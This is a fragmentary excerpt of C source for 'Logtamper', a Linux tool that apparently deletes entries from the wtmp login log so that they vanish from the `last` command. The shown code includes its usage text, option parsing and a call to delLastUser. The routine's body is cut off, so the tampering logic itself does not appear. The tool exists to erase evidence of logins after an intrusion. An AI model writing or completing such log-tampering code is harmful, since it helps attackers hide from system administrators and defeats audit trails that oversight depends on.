...
void usage(void){
	...
	printf("logtamper [-f wtmp_filename] -u [the number you want to delete in `last`, default is 1]\n");
...
int main(int argc,char **argv){
		...
		int ch,ret,val;
		int lflag = 0,hflag = 0,wflag = 0,mflag = 0,uflag = 0;
		
		
		printf("Logtamper v 1.2 for linux\n");
		printf("Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>\n");
		printf("Modify by ZhangWei\n\n");
		
		while((ch = getopt(argc,argv,"l:f:hwmu"))!= EOF){
	...
	if(!(lflag||hflag||mflag||wflag||uflag)){
		usage();
	...
	if(lflag){ /*list user login &logout info*/
		...
		ret = delLastUser(filename,val);
		if(ret < 0){
			printf("Delete Last User Failed\n!");
			exit(1);
		}

		printf("Aho, Check it out!\n");	
	}
...
int delLastUser(const char *filename, const int val){
